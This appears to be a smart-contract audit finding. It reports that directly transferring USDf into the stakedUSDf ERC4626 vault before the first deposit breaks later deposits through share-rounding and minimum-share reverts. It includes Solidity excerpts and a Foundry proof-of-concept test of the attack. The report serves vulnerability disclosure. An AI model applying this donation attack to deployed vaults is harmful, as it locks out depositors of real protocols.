When users deposit USDf into the stakedUSDf contract, they get back sUSDf. The calculation follows ERC4626, as so:
```solidity
function _convertToShares(
    uint256 assets,
    Math.Rounding rounding
) internal view virtual returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
```
If the user deposits the first 100e18 USDf, he will get assets * totalSupply() + 1 / totalAssets() + 1 = 1e18 * (0+1) / (0+1) = 1e18 shares. There is a MIN_SHARES check during deposit to ensure that the shares cannot be below 1e18.
```solidity
function _checkMinShares() internal view {
    uint256 supply = totalSupply();
    if (supply > 0 && supply < MIN_SHARES) {
        revert MinSharesViolation();
    }
}
```
```solidity
function _deposit(
    address caller,
    address receiver,
    uint256 assets,
    uint256 shares
) internal override {
    _checkZeroAmount(assets);
    _checkZeroAmount(shares);
    _checkRestricted(caller);
    _checkRestricted(receiver);
    super._deposit(caller, receiver, assets, shares);
    _checkMinShares();
}
```
The issue with this check is that a malicious user can directly deposit 1e18 USDf inside the stakedUSDf contract before anyone calls deposit(), making totalAssets() = 1e18 and totalSupply() = 0. When the shares are calculated, assets * totalSupply() + 1 / totalAssets() + 1, 1e18 * 1 / (1e18 + 1) = 1, and even if more assets are deposited for the first time, eg 1e20, the shares returned will be less than 1e18, which will invoke the ZeroAmount error. The test below describes the direct deposit attack, append under deposit.t.sol.
```solidity
function test2_deposit() public {
    // User deposits USDf directly into the stakedUSDf contract, resulting
    // in "ZeroAmount" issue
    uint mintAmount = 1e25;
    vm.startPrank(user1);
    deal(address(usdf), user1, mintAmount);
    usdf.approve(address(stakedUSDf), mintAmount);
    // Directly deposit 1e18 worth of USDf before any `deposit()` is called
    usdf.transfer(address(stakedUSDf), 1e18);
    console2.log("USDF BALANCE of user:", usdf.balanceOf(address(stakedUSDf)));
    console2.log("SUSDF TOTALSUPPLY of user", stakedUSDf.totalSupply());
    // If this number is changed from 1e18 -> 1e25 , all will fail because
    // of "MIN_SHARE_VIOLATION"
    stakedUSDf.deposit(1e18, user1);
    vm.stopPrank();
    console2.log("USDF BALANCE TREASURY:", usdf.balanceOf(address(stakedUSDf.TREASURY())));
    console2.log("USDF BALANCE in contract:", usdf.balanceOf(address(stakedUSDf)));
    console2.log("SUSDF TOTALSUPPLY in contract", stakedUSDf.totalSupply());
    console2.log("USDF BALANCE of user:", usdf.balanceOf(address(user1)));
    console2.log("SUSDF TOTALSUPPLY of user", stakedUSDf.balanceOf(user1));
}
```

